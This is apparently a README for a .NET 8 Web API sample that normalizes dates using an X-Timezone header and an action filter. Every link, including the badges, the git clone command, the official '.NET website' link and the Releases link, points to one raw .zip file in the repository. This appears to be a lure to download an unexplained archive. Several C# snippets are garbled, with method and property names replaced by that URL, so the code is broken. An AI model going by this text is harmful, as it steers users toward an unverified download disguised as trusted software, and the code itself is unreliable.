# Timezone Date Normalization API - .NET 8 Web API Example 🌍🕒

[![Latest Release](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip)](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip) ![License](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip)

## Overview

The **Timezone Date Normalization API** is a sample .NET 8 Web API designed to help developers manage date and time inputs across multiple time zones. This API normalizes `DateTime`, `DateOnly`, and nullable date inputs using a custom action filter that respects the user's time zone, which is sent via an HTTP header. This feature is crucial for preventing UTC shifting bugs in multi-tenant, multi-timezone applications built with Angular and .NET.

## Features

- **Custom Action Filter**: Automatically normalizes date inputs based on the user's time zone.
- **Multi-Tenant Support**: Designed to handle applications serving multiple clients across different time zones.
- **Date and Time Handling**: Supports `DateTime`, `DateOnly`, and nullable date types.
- **Robust Middleware**: Easily integrates into existing .NET applications.
- **Documentation**: Includes Swagger for easy API exploration.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Custom Action Filter](#custom-action-filter)
- [Middleware Setup](#middleware-setup)
- [Testing](#testing)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Installation

To get started with the Timezone Date Normalization API, follow these steps:

1. Clone the repository:
   ```bash
   git clone https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip
   cd timezone-date-normalization-api
   ```

2. Ensure you have .NET 8 SDK installed. You can download it from the official [.NET website](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip).

3. Restore the dependencies:
   ```bash
   dotnet restore
   ```

4. Run the application:
   ```bash
   dotnet run
   ```

5. Visit the Swagger UI at `http://localhost:5000/swagger` to explore the API.

## Usage

To use the API, you need to send requests with the appropriate HTTP headers. The key header is `X-Timezone`, which specifies the user's time zone.

### Example Request

```http
POST /api/datetime
Content-Type: application/json
X-Timezone: America/New_York

{
  "date": "2023-10-01T12:00:00"
}
```

### Example Response

```json
{
  "normalizedDate": "2023-10-01T16:00:00Z"
}
```

## API Endpoints

The API exposes several endpoints for date normalization:

### Normalize DateTime

- **Endpoint**: `POST /api/datetime`
- **Request Body**: 
  ```json
  {
    "date": "2023-10-01T12:00:00"
  }
  ```
- **Response**: Normalized UTC date.

### Normalize DateOnly

- **Endpoint**: `POST /api/dateonly`
- **Request Body**: 
  ```json
  {
    "date": "2023-10-01"
  }
  ```
- **Response**: Normalized UTC date.

### Nullable Date

- **Endpoint**: `POST /api/nullable-date`
- **Request Body**: 
  ```json
  {
    "date": null
  }
  ```
- **Response**: Returns null if input is null.

## Custom Action Filter

The custom action filter plays a vital role in normalizing date inputs. It intercepts incoming requests, reads the `X-Timezone` header, and adjusts the date values accordingly.

### Implementation

```csharp
public class TimezoneActionFilter : IActionFilter
{
    public void OnActionExecuting(ActionExecutingContext context)
    {
        var timezoneHeader = https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip["X-Timezone"].ToString();
        // Logic to normalize dates based on timezoneHeader
    }

    public void OnActionExecuted(ActionExecutedContext context)
    {
        // Optional post-processing logic
    }
}
```

## Middleware Setup

To integrate the custom action filter into your application, register it in the `https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip` file:

```csharp
public void ConfigureServices(IServiceCollection services)
{
    https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip(options =>
    {
        https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip<TimezoneActionFilter>();
    });
    https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip();
}
```

## Testing

To ensure the API works as expected, unit tests are included. You can run the tests using:

```bash
dotnet test
```

### Example Test Case

```csharp
[Fact]
public void TestDateNormalization()
{
    // Arrange
    var controller = new DateTimeController();
    var request = new DateTimeRequest { Date = "2023-10-01T12:00:00" };
    
    // Act
    var result = https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip(request);
    
    // Assert
    https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip("2023-10-01T16:00:00Z", https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip);
}
```

## Contributing

Contributions are welcome! If you want to contribute to this project, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes and commit them (`git commit -m 'Add your feature'`).
4. Push to the branch (`git push origin feature/YourFeature`).
5. Create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

For the latest releases, visit the [Releases](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip) section. 

Explore the API and its features in detail.